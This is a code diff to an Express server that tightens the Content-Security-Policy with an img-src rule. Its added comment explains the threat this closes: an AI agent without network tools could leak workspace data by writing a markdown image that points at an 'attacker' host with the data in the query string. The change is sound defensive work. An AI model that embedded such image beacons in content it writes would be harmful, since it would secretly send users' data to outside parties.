@@ -28,7 +28,10 @@ export const defaultWebDist = fileURLToPath(new URL('../web/dist', import.meta.u
 export function createApp(opts: { webDist?: string; mcpRatePerMin?: number; ipRatePerMin?: number; apiRatePerMin?: number } = {}): Express {
   const app = express();
   app.set('trust proxy', 1); // Behind a TLS-terminating reverse proxy, so https and secure cookies are detected correctly
-  app.use((_req, res, next) => { res.setHeader('X-Frame-Options', 'DENY'); res.setHeader('Content-Security-Policy', "frame-ancestors 'none'"); res.setHeader('X-Content-Type-Options', 'nosniff'); res.setHeader('Referrer-Policy', 'same-origin'); next(); }); // The consent page etc. must not be embeddable
+  /* img-src closes the one way an agent could send data out of a workspace. It holds no network tool, but anything it
+     writes is later rendered in a browser, so `![](https://attacker/?q=<what it read>)` in a page it authored would be
+     fetched by the reader. Imported images are copied into /api/assets, so same-origin covers real content. */
+  app.use((_req, res, next) => { res.setHeader('X-Frame-Options', 'DENY'); res.setHeader('Content-Security-Policy', "frame-ancestors 'none'; img-src 'self' data: blob:"); res.setHeader('X-Content-Type-Options', 'nosniff'); res.setHeader('Referrer-Policy', 'same-origin'); next(); }); // The consent page etc. must not be embeddable
   const byIp = ipLimiter(opts.ipRatePerMin ?? config.ipRatePerMin);
   const byToken = tokenLimiter(opts.mcpRatePerMin ?? config.mcpRatePerMin);
   // Per-IP limit for the web API must be generous (one SPA navigation fires several calls; many users may share a NAT); agent operations have a separate per-user limit
